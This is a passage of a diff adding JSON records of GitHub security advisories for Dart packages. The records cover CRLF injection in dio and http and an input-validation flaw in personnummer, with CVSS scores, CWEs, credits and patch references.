+          "starred_url": "https://api.github.com/users/kj415j45/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/kj415j45/subscriptions",
+          "organizations_url": "https://api.github.com/users/kj415j45/orgs",
+          "repos_url": "https://api.github.com/users/kj415j45/repos",
+          "events_url": "https://api.github.com/users/kj415j45/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/kj415j45/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      }
+    ],
+    "comments": 0,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "score": 7.8
+    },
+    "epss": {
+      "percentage": 0.00346,
+      "percentile": 0.27913
+    }
+  },
+  {
+    "ghsa_id": "GHSA-9324-jv53-9cc8",
+    "cve_id": "CVE-2021-31402",
+    "url": "https://api.github.com/advisories/GHSA-9324-jv53-9cc8",
+    "html_url": "https://github.com/advisories/GHSA-9324-jv53-9cc8",
+    "summary": "dio vulnerable to CRLF injection with HTTP method string",
+    "description": "### Impact\nThe dio package 4.0.0 for Dart allows CRLF injection if the attacker controls the HTTP method string, a different vulnerability than CVE-2020-35669.\n\n### Patches\nThe vulnerability has been resolved by https://github.com/cfug/dio/commit/927f79e93ba39f3c3a12c190624a55653d577984, and included since v5.0.0.\n\n### Workarounds\nCherry-pick the commit to your own fork can resolves the vulberability too.\n\n### References\n- https://nvd.nist.gov/vuln/detail/CVE-2021-31402\n- https://osv.dev/GHSA-jwpw-q68h-r678\n- https://github.com/cfug/dio/issues/1130\n- https://github.com/cfug/dio/issues/1752\n",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/cfug/dio/security-advisories/GHSA-9324-jv53-9cc8",
+    "source_code_location": "https://github.com/cfug/dio",
+    "identifiers": [
+      {
+        "value": "GHSA-9324-jv53-9cc8",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2021-31402",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/cfug/dio/security/advisories/GHSA-9324-jv53-9cc8",
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-31402",
+      "https://github.com/cfug/dio/issues/1752",
+      "https://github.com/flutterchina/dio/issues/1130",
+      "https://github.com/cfug/dio/commit/927f79e93ba39f3c3a12c190624a55653d577984",
+      "https://osv.dev/GHSA-jwpw-q68h-r678",
+      "https://security.snyk.io/vuln/SNYK-PUB-DIO-5891148",
+      "https://github.com/advisories/GHSA-9324-jv53-9cc8"
+    ],
+    "published_at": "2023-03-21T22:41:11Z",
+    "updated_at": "2023-10-05T14:01:00Z",
+    "github_reviewed_at": "2023-03-21T22:41:11Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "dio"
+        },
+        "vulnerable_version_range": "< 5.0.0",
+        "first_patched_version": "5.0.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-93",
+        "name": "Improper Neutralization of CRLF Sequences ('CRLF Injection')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "licy183",
+          "id": 45286352,
+          "node_id": "MDQ6VXNlcjQ1Mjg2MzUy",
+          "avatar_url": "https://avatars.githubusercontent.com/u/45286352?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/licy183",
+          "html_url": "https://github.com/licy183",
+          "followers_url": "https://api.github.com/users/licy183/followers",
+          "following_url": "https://api.github.com/users/licy183/following{/other_user}",
+          "gists_url": "https://api.github.com/users/licy183/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/licy183/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/licy183/subscriptions",
+          "organizations_url": "https://api.github.com/users/licy183/orgs",
+          "repos_url": "https://api.github.com/users/licy183/repos",
+          "events_url": "https://api.github.com/users/licy183/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/licy183/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "AlexV525",
+          "id": 15884415,
+          "node_id": "MDQ6VXNlcjE1ODg0NDE1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/15884415?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/AlexV525",
+          "html_url": "https://github.com/AlexV525",
+          "followers_url": "https://api.github.com/users/AlexV525/followers",
+          "following_url": "https://api.github.com/users/AlexV525/following{/other_user}",
+          "gists_url": "https://api.github.com/users/AlexV525/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/AlexV525/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/AlexV525/subscriptions",
+          "organizations_url": "https://api.github.com/users/AlexV525/orgs",
+          "repos_url": "https://api.github.com/users/AlexV525/repos",
+          "events_url": "https://api.github.com/users/AlexV525/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/AlexV525/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      },
+      {
+        "user": {
+          "login": "set0x",
+          "id": 15133015,
+          "node_id": "MDQ6VXNlcjE1MTMzMDE1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/15133015?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/set0x",
+          "html_url": "https://github.com/set0x",
+          "followers_url": "https://api.github.com/users/set0x/followers",
+          "following_url": "https://api.github.com/users/set0x/following{/other_user}",
+          "gists_url": "https://api.github.com/users/set0x/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/set0x/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/set0x/subscriptions",
+          "organizations_url": "https://api.github.com/users/set0x/orgs",
+          "repos_url": "https://api.github.com/users/set0x/repos",
+          "events_url": "https://api.github.com/users/set0x/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/set0x/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "thomas-chauchefoin-sonarsource",
+          "id": 79814170,
+          "node_id": "MDQ6VXNlcjc5ODE0MTcw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/79814170?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/thomas-chauchefoin-sonarsource",
+          "html_url": "https://github.com/thomas-chauchefoin-sonarsource",
+          "followers_url": "https://api.github.com/users/thomas-chauchefoin-sonarsource/followers",
+          "following_url": "https://api.github.com/users/thomas-chauchefoin-sonarsource/following{/other_user}",
+          "gists_url": "https://api.github.com/users/thomas-chauchefoin-sonarsource/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/thomas-chauchefoin-sonarsource/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/thomas-chauchefoin-sonarsource/subscriptions",
+          "organizations_url": "https://api.github.com/users/thomas-chauchefoin-sonarsource/orgs",
+          "repos_url": "https://api.github.com/users/thomas-chauchefoin-sonarsource/repos",
+          "events_url": "https://api.github.com/users/thomas-chauchefoin-sonarsource/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/thomas-chauchefoin-sonarsource/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      }
+    ],
+    "comments": 0,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "score": 7.5
+    },
+    "epss": {
+      "percentage": 0.01167,
+      "percentile": 0.66517
+    }
+  },
+  {
+    "ghsa_id": "GHSA-9f2c-xxfm-32mj",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-9f2c-xxfm-32mj",
+    "html_url": "https://github.com/advisories/GHSA-9f2c-xxfm-32mj",
+    "summary": "Duplicate of GHSA-4xh4-v2pq-jvhm",
+    "description": "## Duplicate Advisory\n\nThis advisory has been withdrawn because it is a duplicate of [GHSA-4xh4-v2pq-jvhm](https://github.com/advisories/GHSA-4xh4-v2pq-jvhm). This link is maintained to preserve external references.\n\n## Original Description\n\nThe personnummer implementation before 3.0.3 for Dart mishandles numbers in which the last four digits match the ^000[0-9]$ regular expression.",
+    "type": "reviewed",
+    "severity": "low",
+    "repository_advisory_url": null,
+    "source_code_location": "",
+    "identifiers": [
+      {
+        "value": "GHSA-9f2c-xxfm-32mj",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/personnummer/dart/security/advisories/GHSA-4xh4-v2pq-jvhm",
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-22963",
+      "https://github.com/advisories/GHSA-4xh4-v2pq-jvhm",
+      "https://github.com/advisories/GHSA-9f2c-xxfm-32mj"
+    ],
+    "published_at": "2023-01-11T06:30:20Z",
+    "updated_at": "2023-01-27T05:03:48Z",
+    "github_reviewed_at": "2023-01-11T18:58:40Z",
+    "nvd_published_at": "2023-01-11T06:15:00Z",
+    "withdrawn_at": "2023-01-11T18:58:40Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "personnummer"
+        },
+        "vulnerable_version_range": "< 3.0.3",
+        "first_patched_version": "3.0.3",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+
+    ],
+    "credits": [
+
+    ],
+    "comments": 0,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-4xh4-v2pq-jvhm",
+    "cve_id": "CVE-2023-22963",
+    "url": "https://api.github.com/advisories/GHSA-4xh4-v2pq-jvhm",
+    "html_url": "https://github.com/advisories/GHSA-4xh4-v2pq-jvhm",
+    "summary": "personnummer/dart vulnerable to Improper Input Validation",
+    "description": "This vulnerability was reported to the personnummer team in June 2020. The slow response was due to locked ownership of some of the affected packages, which caused delays to update packages prior to disclosure.\n\nThe vulnerability is determined to be low severity.\n\n### Impact\n\nThis vulnerability impacts users who rely on the for last digits of personnummer to be a _real_ personnummer.  \n\n### Patches\n\nThe issue have been patched in all repositories. The following versions should be updated to as soon as possible:\n\n[C#](https://github.com/advisories/GHSA-qv8q-v995-72gr) 3.0.2  \nD 3.0.1  \n[Dart](https://github.com/advisories/GHSA-4xh4-v2pq-jvhm) 3.0.3  \nElixir 3.0.0  \n[Go](https://github.com/advisories/GHSA-hv53-vf5m-8q94) 3.0.1  \n[Java](https://github.com/advisories/GHSA-q3vw-4jx3-rrr2) 3.3.0  \n[JavaScript](https://github.com/advisories/GHSA-vpgc-7h78-gx8f) 3.1.0  \nKotlin 1.1.0  \nLua 3.0.1  \n[PHP](https://github.com/advisories/GHSA-2p6g-gjp8-ggg9) 3.0.2  \nPerl 3.0.0  \n[Python](https://github.com/advisories/GHSA-rxq3-5249-8hgg) 3.0.2  \n[Ruby](https://github.com/advisories/GHSA-vp9c-fpxx-744v) 3.0.1  \n[Rust](https://github.com/advisories/GHSA-28r9-pq4c-wp3c) 3.0.0  \nScala 3.0.1  \nSwift 1.0.1  \n\nIf you are using any of the earlier packages, please update to latest.\n\n### Workarounds\n\nThe issue arrieses from the regular expression allowing the first three digits in the last four digits of the personnummer to be\n000, which is invalid. To mitigate this without upgrading, a check on the last four digits can be made to make sure it's not\n000x.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [Personnummer Meta](https://github.com/personnummer/meta/issues)\n* Email us at [Personnummer Email](mailto:security@personnummer.dev)",
+    "type": "reviewed",
+    "severity": "low",
+    "repository_advisory_url": "https://api.github.com/repos/personnummer/dart/security-advisories/GHSA-4xh4-v2pq-jvhm",
+    "source_code_location": "https://github.com/personnummer/dart",
+    "identifiers": [
+      {
+        "value": "GHSA-4xh4-v2pq-jvhm",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2023-22963",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/personnummer/dart/security/advisories/GHSA-4xh4-v2pq-jvhm",
+      "https://pub.dev/packages/personnummer",
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-22963",
+      "https://github.com/advisories/GHSA-4xh4-v2pq-jvhm"
+    ],
+    "published_at": "2022-09-19T22:47:29Z",
+    "updated_at": "2023-01-11T18:59:11Z",
+    "github_reviewed_at": "2022-09-19T22:47:29Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "personnummer"
+        },
+        "vulnerable_version_range": "< 3.0.3",
+        "first_patched_version": "3.0.3",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      }
+    ],
+    "credits": [
+
+    ],
+    "comments": 0,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00512,
+      "percentile": 0.42796
+    }
+  },
+  {
+    "ghsa_id": "GHSA-jwpw-q68h-r678",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-jwpw-q68h-r678",
+    "html_url": "https://github.com/advisories/GHSA-jwpw-q68h-r678",
+    "summary": "Duplicate Advisory: Improper Neutralization of CRLF Sequences in dio",
+    "description": "## Duplicate advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-9324-jv53-9cc8. This link is maintained to preserve external references.\n\n## Original Description\nThe dio package prior to 5.0.0 for Dart allows CRLF injection if the attacker controls the HTTP method string, a different vulnerability than CVE-2020-35669.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/cfug/dio",
+    "identifiers": [
+      {
+        "value": "GHSA-jwpw-q68h-r678",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-31402",
+      "https://github.com/cfug/dio/issues/1130",
+      "https://github.com/cfug/dio/commit/927f79e93ba39f3c3a12c190624a55653d577984",
+      "https://osv.dev/GHSA-jwpw-q68h-r678",
+      "https://github.com/advisories/GHSA-jwpw-q68h-r678"
+    ],
+    "published_at": "2022-05-24T17:47:44Z",
+    "updated_at": "2023-10-05T17:32:48Z",
+    "github_reviewed_at": "2022-09-15T03:27:03Z",
+    "nvd_published_at": "2021-04-15T19:15:00Z",
+    "withdrawn_at": "2023-10-05T17:32:48Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "dio"
+        },
+        "vulnerable_version_range": "< 5.0.0",
+        "first_patched_version": "5.0.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-74",
+        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
+      },
+      {
+        "cwe_id": "CWE-88",
+        "name": "Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')"
+      },
+      {
+        "cwe_id": "CWE-93",
+        "name": "Improper Neutralization of CRLF Sequences ('CRLF Injection')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "AlexV525",
+          "id": 15884415,
+          "node_id": "MDQ6VXNlcjE1ODg0NDE1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/15884415?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/AlexV525",
+          "html_url": "https://github.com/AlexV525",
+          "followers_url": "https://api.github.com/users/AlexV525/followers",
+          "following_url": "https://api.github.com/users/AlexV525/following{/other_user}",
+          "gists_url": "https://api.github.com/users/AlexV525/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/AlexV525/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/AlexV525/subscriptions",
+          "organizations_url": "https://api.github.com/users/AlexV525/orgs",
+          "repos_url": "https://api.github.com/users/AlexV525/repos",
+          "events_url": "https://api.github.com/users/AlexV525/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/AlexV525/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      }
+    ],
+    "comments": 0,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "score": 7.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-4rgh-jx4f-qfcq",
+    "cve_id": "CVE-2020-35669",
+    "url": "https://api.github.com/advisories/GHSA-4rgh-jx4f-qfcq",
+    "html_url": "https://github.com/advisories/GHSA-4rgh-jx4f-qfcq",
+    "summary": "http before 0.13.3 vulnerable to header injection",
+    "description": "An issue was discovered in the http package before 0.13.3 for Dart. If the attacker controls the HTTP method and the app is using Request directly, it's possible to achieve CRLF injection in an HTTP request via HTTP header injection. This issue has been addressed in commit abb2bb182 by validating request methods.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/dart-lang/http",
+    "identifiers": [
+      {
+        "value": "GHSA-4rgh-jx4f-qfcq",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2020-35669",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2020-35669",
+      "https://github.com/dart-lang/http/issues/511",
+      "https://github.com/dart-lang/http/blob/master/CHANGELOG.md#0133",
+      "https://github.com/dart-lang/http/pull/512",
+      "https://github.com/dart-lang/http/commit/abb2bb182fbd7f03aafd1f889b902d7b3bdb8769",
+      "https://pub.dev/packages/http/changelog#0133",
+      "https://github.com/advisories/GHSA-4rgh-jx4f-qfcq"
+    ],
+    "published_at": "2022-05-24T17:37:16Z",
+    "updated_at": "2023-01-27T05:03:00Z",
+    "github_reviewed_at": "2022-08-04T21:05:04Z",
+    "nvd_published_at": "2020-12-24T03:15:00Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "http"
+        },
+        "vulnerable_version_range": "< 0.13.3",
+        "first_patched_version": "0.13.3",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "score": 6.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-74",
+        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
+      }
+    ],
+    "credits": [
+
+    ],
+    "comments": 0,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+      "score": 6.1
+    },
+    "epss": {
+      "percentage": 0.02155,
+      "percentile": 0.81503
+    }
+  }
+]
